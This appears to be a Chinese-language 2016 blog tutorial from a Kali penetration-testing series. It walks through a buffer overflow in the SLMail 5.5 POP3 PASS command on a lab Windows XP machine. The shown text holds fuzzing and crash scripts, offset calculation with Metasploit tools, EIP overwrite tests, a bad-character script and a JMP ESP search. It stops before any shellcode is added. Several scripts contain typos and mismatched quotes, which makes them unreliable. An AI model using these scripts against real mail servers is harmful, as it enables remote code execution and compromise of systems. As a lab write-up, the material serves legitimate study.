---
title: 缓冲区溢出
date: 2016-06-15 20:30
tags: ['Kali渗透测试']
toc: true
categories: technology

---
### 0x00 缓冲区
缓冲区其实是内存中的一个片段，用于存放内存中的数据。我们知道程序是动态的，会根据不同的输入，参数等等而产生不同的计算结果，因为计算机程序的应用，使得整个人类的计算能力得到了上帝的技能，但是这也成为了程序的致命弱点，它无法判断哪些输入是有有害的，哪些输入会导致内存溢出或者计算机崩溃。

程序漏洞其本质上是数据与代码边界的混淆不清，从而让程序执行了一些不可预测的指令。

---
#### 缓冲区溢出
当缓冲区边界限制不严格时,由于变量传入畸形数据或程序运行错误,导致缓冲区被“撑
暴”,从而覆盖了相邻内存区域的数据;


成功修改内存数据,可造成进程劫持,执行恶意代码,获取服务器控制权等后果.
 
---
#### 如何发现漏洞?
目前比较主流的发现漏洞的方法有三种方式 :**源码审计** ，**逆向工程**，**模糊测试**。

---
### 0x01 Windows 缓冲区溢出
目标环境:SLMail 5.50Mail Server(OS XP;ip:192.168.1.12)
动态调试工具:ImmunityDebugger
测试脚本:mona.py
操作环境:OS:Kali;ip:192.168.1.11
ImmunityDebugger 可以调用 py脚本，并且其自动化程序更高。

当 SLMail 邮件服务安装完成以后 `netstat -nao` 查看端口检测是否安装成功.可以发现，25,110,180等端口都已经开放。

![SLMail](http://upload-images.jianshu.io/upload_images/1571420-a6dc28c7dc5d1066.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

Ok,服务器软件安装成功以后便可以安装 Debugger 工具了。

对于 mona.py 脚本程序我们可以在 Github 中获得。

一切安装完成以后，将 `mona.py` 脚本导入到 `Immunity Debugger\PyCommands` 目录就好了。

本次实验并不适合在 XP 以上的 window中环境中测试，因为 SLMail 是个很早的软件了，此外从 win7 开始微软便加入了系统级别的 DEP 和 ASLR 防护。

DEP: 结合 CPU 特性，通过软硬件的协同，阻止代码从数据页被执行。这样即使代码存在漏洞，也不会那么容易被直接利用。奈何，黑客的存在就是为了打破规则的，现在 DEP 也被绕的出不多算是个摆设了。所以，微软接着又提出来 ASLR 返回机制。

ASLR: 很久以前，代码在 os  内存中执行的地址是固定，我们甚至可以直接将某个 shell 打到一个指定的内存地址中去执行代码。这种基于静态的内存分配机制很容易被利用。所以，基于动态的，随机内存地址加载执行程序和 DLL内存分配机制便被广泛应用起来。

---
### 0x02 POP3 
网络协议何止一种，当我遇到不熟悉的网络协议的时候，可以使用 wireshark 去抓包，去分析，了解这个我们原本不熟悉的协议。当然我们现在已经知道 SLMali 中 POP3 协议 的 `PASS` 命令是存在的，并且存在缓存区溢出的。
 
使用 `pass ` 对 XP SLMail 100 端口发送数据。但是要发生缓冲区溢出，意味着我们需要对其发送大量的数据，而为了搞清楚到底多大的数据请求会导致其缓冲区溢出，我们需要不断的迭代累加的去发起请求，以次获得最接近的那个临界值，那么，现在从一个简单的 02.py 脚本开始

##### 02.py

```
#!/usr/bin/python

import socket

buffer = ["A"]
counter = 100
while len(buffer) <= 50:
	buffer.append("A" *counter)
	counter = counter + 200

for string in buffer:
	print "Fuzzing PASS with %s bytes" % len(string)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect(('192.168.1.12', 110))
	s.recv(1024)
	s.send('USER test'+ '\r\n')
	s.recv(1024)
	s.send('PASS ' + string + '\r\n')
	s.send('QUIT\r\n')
	s.close() 
```

> 当然，如果我们已经发送了大量的弹出数据但是依旧没有发生溢出，这时我们可以放弃对这个参数的模糊测试了。



---
#### Debugger
数据一旦发送，便可以打开 XP 中的 Debugger 工具观察服务器状态。

![Dubugger](http://upload-images.jianshu.io/upload_images/1571420-f9f0948ccd1118ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

我们可在 `file>open` 直接打开一个 `.exe` 文件进行静态调试，也可以 `file>Attach` 选择一个正在运行的程序进行动态调试。

##### Attach


![Attach](http://upload-images.jianshu.io/upload_images/1571420-22627775f9d12909.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

我们选择 `Attach` 并对 `SLMail` 这个程序进行 Attach。但一个正在运行的程序被 `Attach` 后便会暂停运行，为了观察我们需要让其继续运行起来。


![run again](http://upload-images.jianshu.io/upload_images/1571420-f22ee3dfd71f9015.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

##### 正式发起数据请求
现在我们通过 Kali 运行 02.py 脚本对其发送大量数据


![Paste_Image.png](http://upload-images.jianshu.io/upload_images/1571420-b22e7bf55799bb22.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


在右侧的 `Register` 中，`EIP` 寄存器中所存放的的下一条指令的地址。通过 `EIP` 寄存器我们做蛮多有意思的事情，就是当发现缓存区溢出以后如去利用。

运行 `02.py` 脚本程序，我们每次递增 100 个字节向目标服务器发起请求数据，可以看到当发送的字节数达到 3000 bytes 时，程序崩溃了，说明 `PASS` 指令确实存在缓冲区溢出，而为了得到更加精确的崩溃临界点，我们有了 `03.py` 脚本程序。

##### 03.py
```
#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer = "A" * 2700
try:
    print "\nSending evil buffer..."
    s.connect('192.168.1.12", 110)
    data = s.recv(1024)
    s.send('USER admin' + '\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3"
```

通过，`03.py` 脚本首先发送了 2700 个 "A",发现程序也崩溃了，于是尝试减少发送的数据量为 2600 个 "A"，发现程序还是崩溃了，但是与 2700 个字符串导致的崩溃不同，2600 个 "A" 并没有完全覆盖 EIP 寄存器，这意味着我们得到了一个区间，在 2700~2600之间，我们离潘多拉的魔盒又近了一步，现在，我们有两种方式去尝试打开盒子，一个是二分法，不断的细分这个区间的值，虽然这种方式有点笨，但是终归是可以找到真理的。或者，可以试试唯一字符串的方式。

Python 中自带了一个能生成唯一字符串的脚本程序 `pattern_create.rb`

```
./usr/shaer/metasploit-framework/tools/exploit/pattern_create.rb 2700
// 生成2700个唯一字符串 {str}
```

我们将 {str} 字符串替换掉 `03.py` 中的 "A"，得到 `04.py`：

##### 04.py

```
#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer = "str"
try:
    print "\nSending evil buffer..."
    s.connect('192.168.1.12", 110)
    data = s.recv(1024)
    s.send('USER admin' + '\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3"
```

再次发送数据，程序崩溃，得到 EIP 寄存器中的数值 `39 69 44 38`
计算机和人不一样，它在寄存器中所存储的数据的顺序是从高位向地位的，所以转换为人类的可读顺序就是 `38 44 69 39`，然后t通过对照 ASCII 码表，我们可以得到其确切的信息。

```
十六进制:38 44 69 39
ASCII:8 D i 9 
```

进一步执行 `exploit` 目录下的 `pattern_offset.rb` 文件便可以得到 `39 69 44 38` 在唯一字符串中的精准偏移量:

```
root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb 39694438
[*] Exact match at offset 2606
```

我们得到了溢出的位置，即是程序是从 2606 这个位置开始崩溃的，但是为了再次验证这个结果可靠性，我们再次对 `03.py` 脚本进行修改，让其先发送 2606 个 `A` ，再发送四个 `B`，接着发送20个 `C`，然后去观察 `Dubugger` 调试工具中的 `EIP` 寄存器是否会被写入4个 `B`?

##### 05.py

```
#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer = "A"*2606 + "B"*4 + "C"*20
try:
    print "\nSending evil buffer..."
    s.connect('192.168.1.12", 110)
    data = s.recv(1024)
    s.send('USER admin' + '\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3"
```

我们发现，得到结果和我们预想的一样，程序崩溃后，`EIP` 被填满了 `424242` [ B 对应的 ASCII 码是 42]，同时 `ESP` 被填满了20个 `C`,如此，我们知道了，程序确是 2606 这个位置发生了溢出，而当溢出后我们便可以从这位置开始写入任意 `指令` 了。

> 潘多拉的魔盒已开，我要进去看看另一个世界的样子

---
###  0x03 模糊测试(Fuzzing)

---
#### 思路
我们已经得到了 `EIP` 的溢出地址，而下一步我们需要将 `EIP` 修改为 shellcode 代码的内存地址，从而将 shellcode 写入到该地址空间，当程序读取 `EIP` 寄存器数值时，将跳转到 shellcode 代码段并执行。


---
#### 寻找可存放 shellcode 的内存空间
通过之前的操作，我们发现原来 `ESP` 寄存器也是可以被修改的，那么，现在尝试将 `ESP` 作为 shellcode 的存放空间。

首先，假设目标的内存中可以存放的字符总数是 3500 个，去掉 `EIP` 寄存器中的 2606+4 个，理论上，`ESP` 中将会存放 `3500-2606+4` 个字符,由此，便可以判断 `ESP` 的容量大小是否可以作为 shellcode 的存放空间。

可在 `03.py` 脚本的基础上得到 `05.py`(其实，除了 buffer 不一样， 03.py, 04.py, 05.py, 06.py都是同一个脚本程序)

```
#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer = "A"*2606 + "B"*4 + "C"*(3500 - 2606 -4)
try:
    print "\nSending evil buffer..."
    s.connect('192.168.1.12", 110)
    data = s.recv(1024)
    s.send('USER admin' + '\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3"
```

同样，我们再次重启 SLMail 服务，并打开 Debugger 调试工具，运行脚本程序。打开 Debugger `EIP` 的内存地址被精准的修改为 `42424242`，而 `ESP` 被填满了很多的 "C"，对 `ESP` 右键选择 `Follow In Dump` ，通过界面中的 `Address` 栏， 同时为了观察的方便，将`Hex`调整为 `16bytes` 。

发现最开始出现 "C" 的地址为 `EF7A154` ，而 "C" 的结束位置是`EF7A2F4`，通过计算得到其差值为 `1A0`，装换为十进制为 `416`。 即是 `ESP` 寄存器可以存放 `416 bytes` 的数据，可以满足一条 shellcode 所需的存放空间。

似乎，只需将 shellcode 放进去就好了。。。是，想象是美好的，二进制的世界是残酷的，我们遇到的第一个问题就是 **坏字符**。

---
#### 坏字符
不同类型的程序，协议，漏洞，会将某些字符认为是坏字符，一旦在内存中出现这些字符，将会导致程序的崩溃或者锁死，或者本过滤，因为这些字符通常有固定的用途。

比如 `0x00 空子符`,`0x0D 回车`，但这只是基于我们已知的认知，是否其 `ESP` 中还存在其他坏字符呢？而如果要对 `ESP` 注入 shellcode ，又需要先将 `ESP` 中的坏字符全部挑选出来。

此时，我们需要用到脚本 `07.py` 

##### 07.py
基本原理:在 ASCII 中一个字符表示一个字节，而一个字节代表一个 8位的二进制数，从[00000000 ~ 11111111] 一共可以表示 256 个可能的字符。

那么，可以发送 0x00 ~ 0xff 共 256 个字符进行测试，以此找出所有的坏字符。

```
#!/usr/bin/python
import socket

badChars = {"---"
"---"
"---"
}

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer = "A"*2606 + "B"*4 + badChars
try:
    print "\nSending evil buffer..."
    s.connect('192.168.1.12", 110)
    data = s.recv(1024)
    s.send('USER admin' + '\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3"
```

通过对 Dubugger 的观察(即是当程序崩溃是，Address 中出现不连续的字符序列，即可找出坏字符)，我们一共找出了三个坏字符`0x00`,  `0x0A`, `0x0D`。

---
### 0x04 数据重定向
我们已经找到了所有的坏字符，现在可以开始进行数据重定向了，即只要将 ESP 的地址替换为 EIP 的值就可以了。但是问题有又来了，计算机 ESP 寄存器的地址是随机变化的，每次开关机，每次运行 SLMail 程序都会随机变化。

面对这个问题，我们的思路如下:
* 首先在内存中寻找内存地址固定的系统模块。
* 其次在模块中寻找 `JMP ESP` 指令的地址，再由该指令间接跳转到 `ESP`，从而执行 `shellcode`。
* 然后使用 `mona.py` 脚本识别内存模块，搜索 `return address` 是 `JMP ESP` 的指令模块。
* 再寻找无 DEP,ALSR 保护的内存地址。
* 最后，确保内存地址中不包含坏字符。

这也是进行缓冲区溢出遇到目标地址随机变化时常用的思路，找到一个内存地址固定不变的系统模块中 `JMP ESP` 指令所在的地址，通过该地址跳转到 ESP，以不变应万变。


---
#### 如何找?
`mona.py` 自带的脚本程序可以很好的帮助我们去发现系统中的 `JMP ESP` 地址。

在 `Immunity Debugger` 中输入 `!mona modules` ,可以得到 SMLMail 程序运行时所调用的系统模块。


![!mona modules](http://upload-images.jianshu.io/upload_images/1571420-95aefa4e048a68ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


找到 `Rebase` ，`SafeSEH`, `ASLR`,`NXCompat` 为 `False` ，而 `OS DLL` 为 `True` 的系统模块。(假如该模块的名称是 `USER32.dll`)

---
#### nasm_shell.rb
Kali 中的 `nasm_shell.rb` 脚本可以将汇编语言转换为二进制。
运行该脚本,将指令 `jmp esp` 转换为二进制:

```
root@kali:/usr/share/metasploit-framework/tools/exploit# ./nasm_shell.rb 
nasm > jmp esp
00000000  FFE4       jmp esp
```

如上，我们得到了 `jmp esp` 指令的二进制表示为 `FFE4`,回到 `Debugger` 调试工具,使用 `!mona find -s "\xff\xe4 -m UERSER32.dll"`，去查找 `openc32.dll` 中是否存在 `jmp esp` 指令。


![jmp esp](http://upload-images.jianshu.io/upload_images/1571420-ac1005f109595fdb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)








未完待续。。。


